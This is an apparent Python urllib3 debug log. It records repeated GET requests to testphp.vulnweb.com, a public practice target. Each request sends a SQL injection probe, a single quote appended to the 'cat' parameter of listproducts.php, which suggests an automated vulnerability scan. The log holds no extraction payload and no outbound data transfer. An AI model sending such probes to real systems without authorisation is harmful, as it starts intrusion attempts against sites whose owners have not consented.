DEBUG [2022-05-09 15:21:26,240] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:26,983] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:26,990] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:27,824] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:27,830] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:28,693] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:28,700] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:32,799] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:32,805] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:33,648] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:33,655] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:34,564] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:34,570] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:35,384] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:35,390] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:36,144] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:36,159] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:38,874] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:38,880] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:39,604] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:39,610] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:40,334] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:40,340] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:41,047] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:41,053] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:41,760] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:41,778] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:42,473] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:42,480] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:43,199] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:43,208] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:43,934] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:43,942] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:44,633] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:44,639] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:45,324] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:45,330] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:45,995] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:46,014] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:46,688] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:46,694] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:47,374] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:47,381] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:48,224] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:48,230] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:48,923] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:48,930] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:49,644] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:49,650] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:50,332] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:50,338] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:51,040] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:51,046] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:51,727] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:51,734] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:52,434] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:52,441] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:53,128] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:53,135] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:53,802] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
DEBUG [2022-05-09 15:21:53,808] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): testphp.vulnweb.com:80]
DEBUG [2022-05-09 15:21:54,504] urllib3.connectionpool 26183 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://testphp.vulnweb.com:80 "GET /listproducts.php?cat=1' HTTP/1.1" 200 None]
